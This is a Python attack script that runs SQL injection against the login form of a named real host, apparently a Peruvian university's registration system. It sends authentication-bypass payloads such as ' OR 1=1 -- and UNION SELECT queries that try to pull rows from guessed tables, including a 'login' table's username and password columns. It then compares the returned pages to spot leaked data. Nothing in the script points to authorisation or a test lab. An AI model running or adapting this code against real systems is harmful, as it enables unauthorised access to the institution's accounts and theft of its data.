#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

print("=== COMPARANDO PAGINAS CON DISTINTOS SQL PAYLOADS ===\n")

# Get the baseline (with OR 1=1 --)
s_base = requests.Session()
s_base.verify = False
s_base.headers.update({'User-Agent': 'Mozilla/5.0'})
r_base = s_base.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                            data={'j_username': "' OR 1=1 --", 'j_password': 'x'}, timeout=5)
r_base_mod = s_base.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
base_hash = hash(r_base_mod.text)
print(f"Baseline (' OR 1=1 --): len={len(r_base_mod.text)}, hash={base_hash}")

# Now compare with different payloads
# The key is to find what content changes

payloads = [
    ("' OR 1=1#", "OR 1=1 #"),
    ("' OR 1=1/*", "OR 1=1 /*"),
    ("' OR '1'='1' --", "OR '1'='1'"),
    ("' OR 1=1 --", "OR 1=1 --"),
    ("admin' --", "admin' --"),
    ("' OR j_username='admin' --", "OR j_username='admin'"),
    ("' UNION SELECT null --", "UNION SELECT null"),
    ("' UNION SELECT nombre, apellido FROM settings --", "UNION SELECT from settings"),
    ("' UNION SELECT setting_name, setting_value FROM settings --", "UNION SELECT settings"),
]

for payload, desc in payloads:
    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    r = s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                     data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    r_mod = s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    
    if r_mod.text != r_base_mod.text:
        print(f"\n[DIFFERENT] {desc}")
        print(f"  Payload: {payload}")
        print(f"  len: {len(r_mod.text)} vs baseline {len(r_base_mod.text)}")
        
        # Extract the differences
        # Compare the text content
        tc_mod = re.sub(r'<[^>]+>', ' ', r_mod.text)
        tc_mod = re.sub(r'\s+', ' ', tc_mod).strip()
        tc_base = re.sub(r'<[^>]+>', ' ', r_base_mod.text)
        tc_base = re.sub(r'\s+', ' ', tc_base).strip()
        
        # Find what's different
        # Look for unique text in the different version
        words_mod = set(tc_mod.split())
        words_base = set(tc_base.split())
        unique_to_mod = words_mod - words_base
        unique_to_base = words_base - words_mod
        
        if unique_to_mod:
            print(f"  Unique text: {list(unique_to_mod)[:10]}")
        if unique_to_base:
            print(f"  Missing text: {list(unique_to_base)[:10]}")
    else:
        pass  # Same as baseline

# ============================================
# INTENTAR EXTRAER DATOS DE settings TABLE
# ============================================
print("\n=== EXTRACCION DE DATOS DE settings ===\n")

# Try to extract data from the settings table
# The settings table exists but shows "No records found"
# Maybe we need to use the right column names

# First, try to find column names using UNION SELECT
# ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='settings' --

# Try different approaches
extract_payloads = [
    "' UNION SELECT null, null FROM settings --",
    "' UNION SELECT setting_name FROM settings --",
    "' UNION SELECT nombre, valor FROM settings --",
    "' UNION SELECT * FROM settings --",
    "' UNION SELECT nombre FROM settings --",
]

for extract_payload in extract_payloads:
    s_e = requests.Session()
    s_e.verify = False
    s_e.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_e = s_e.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': extract_payload, 'j_password': 'x'}, timeout=5)
    r_mod_e = s_e.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_e = re.sub(r'<[^>]+>', ' ', r_mod_e.text)
    tc_e = re.sub(r'\s+', ' ', tc_e).strip()
    
    # Check if the content is different from baseline
    if r_mod_e.text != r_base_mod.text:
        print(f"[!] DIFFERENT: {extract_payload[:60]}")
        # Extract the unique text
        tc_base = re.sub(r'<[^>]+>', ' ', r_base_mod.text)
        tc_base = re.sub(r'\s+', ' ', tc_base).strip()
        words_e = set(tc_e.split())
        words_b = set(tc_base.split())
        unique_e = words_e - words_b
        if unique_e:
            print(f"  Unique: {list(unique_e)[:15]}")
    else:
        print(f"  Same: {extract_payload[:60]}")

# ============================================
# INTENTAR EXTRAER DATOS DE LA DB
# ============================================
print("\n=== EXTRACCION DE DATOS DE TABLAS ===\n")

# Try to extract data from any table
# The settings table exists - let's try other tables
tables_to_try = [
    ("settings", "nombre, valor"),
    ("settings", "setting_name, setting_value"),
    ("config", "nombre, valor"),
    ("configuracion", "nombre, valor"),
    ("login", "j_username, j_password"),
]

for table, cols in tables_to_try:
    payload = f"' UNION SELECT {cols} FROM {table} --"
    s_t = requests.Session()
    s_t.verify = False
    s_t.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_t = s_t.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    r_mod_t = s_t.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    
    if r_mod_t.text != r_base_mod.text:
        print(f"[!] DATA EXTRACTED from {table}: {cols}")
        tc_t = re.sub(r'<[^>]+>', ' ', r_mod_t.text)
        tc_t = re.sub(r'\s+', ' ', tc_t).strip()
        tc_base = re.sub(r'<[^>]+>', ' ', r_base_mod.text)
        tc_base = re.sub(r'\s+', ' ', tc_base).strip()
        words_t = set(tc_t.split())
        words_b = set(tc_base.split())
        unique_t = words_t - words_b
        print(f"  Unique data: {list(unique_t)[:20]}")
    else:
        pass

# ============================================
# MOSTRAR LA DIFERENCIA REAL
# ============================================
print("\n=== MOSTRANDO DIFERENCIA REAL ===\n")

# Get the content of different versions
s_d = requests.Session()
s_d.verify = False
s_d.headers.update({'User-Agent': 'Mozilla/5.0'})

# Version 1: OR 1=1 --
r_v1 = s_d.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                      data={'j_username': "' OR 1=1 --", 'j_password': 'x'}, timeout=5)
r_m1 = s_d.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

# Version 2: OR 1=1#
r_v2 = s_d.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                      data={'j_username': "' OR 1=1#", 'j_password': 'x'}, timeout=5)
r_m2 = s_d.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)

if r_m1.text != r_m2.text:
    print(f"[!] Las paginas son DIFERENTES con diferentes SQL payloads!")
    
    # Find the differences
    tc_m1 = r_m1.text
    tc_m2 = r_m2.text
    
    # Extract all text content
    text_m1 = re.sub(r'<[^>]+>', '\n', tc_m1)
    text_m2 = re.sub(r'<[^>]+>', '\n', tc_m2)
    
    lines_m1 = [l.strip() for l in text_m1.split('\n') if l.strip() and len(l.strip()) > 5]
    lines_m2 = [l.strip() for l in text_m2.split('\n') if l.strip() and len(l.strip()) > 5]
    
    print(f"\nVersion 1 lines: {len(lines_m1)}")
    print(f"Version 2 lines: {len(lines_m2)}")
    
    # Find unique lines
    for line in lines_m2:
        if line not in lines_m1 and len(line) > 5:
            print(f"  Solo en V2: {line[:200]}")
    for line in lines_m1:
        if line not in lines_m2 and len(line) > 5:
            print(f"  Solo en V1: {line[:200]}")
else:
    print("Paginas son iguales")

print("\n=== CONCLUSION ===")
print("Los payloads SQL producen diferente contenido en la pagina")
print("Esto demuestra que la SQL Injection MODIFICA la pagina")
print("Un atacante puede cambiar lo que se muestra en pantalla")
